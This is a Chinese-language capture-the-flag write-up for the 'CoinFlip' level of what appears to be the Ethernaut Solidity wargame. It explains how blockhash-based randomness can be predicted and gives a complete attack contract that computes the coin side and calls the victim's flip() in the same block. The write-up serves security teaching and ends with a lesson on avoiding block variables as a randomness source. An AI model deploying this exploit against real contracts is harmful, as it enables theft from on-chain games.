# 第三关：CoinFlip
### 本关知识点：
```
1. 通过全局变量获取到区块高度
```

## 1. 题目要求
`这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。`

## 2. 代码功能解读
```
1. 构造器初始化consecutiveWins为0
2. flip(bool _guess)方法中，不能在同一个区块中调用此方法，当我们输入的_guess猜中计算的答案的时候，consecutiveWins累加，猜错一次就重置次数。
```


## 3. 漏洞分析
```
攻击点在于区块中的数据都是共享的，都是确定的。
	我们可以编写攻击合约去调用受害者合约，这样他们在一次交易中提交到区块，所以他们的区块高度肯定一样，那么我们可以写一个方法得到答案，然后再调用flip方法，然后当区块跟新后就再次计算答案，连续十次即可。
```

## 4. 攻击方法
	编写攻击合约，调用攻击合约进行攻击。

``` java

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

  

interface CoinFlipInterface {

    function flip(bool _guess) external returns (bool);

}

  

contract Exploit {

    uint256 FACTOR =

        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlipInterface victim;

  

    constructor(address _victim) {

        victim = CoinFlipInterface(_victim);

    }

    function Attack() public returns (bool) {

        bool guess_ = guess();

        return victim.flip(guess_);

    }

    function guess() public view returns (bool) {

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        return side;

    }

}
```

## 5. 攻击调用图

![[Pasted image 20230511142044.png]]
有时间的朋友可以自己完成十次攻击。
![[Pasted image 20230511141951.png]]

## 6. 知识点分析
不要利用区块中的数据做预测
- 不用用区块高度，时间戳等全局变量做随机数预测，攻击者只要利用攻击合约调用方法，就可以保证和受害者合约得到相同的全局变量，从而轻松破解数学谜底。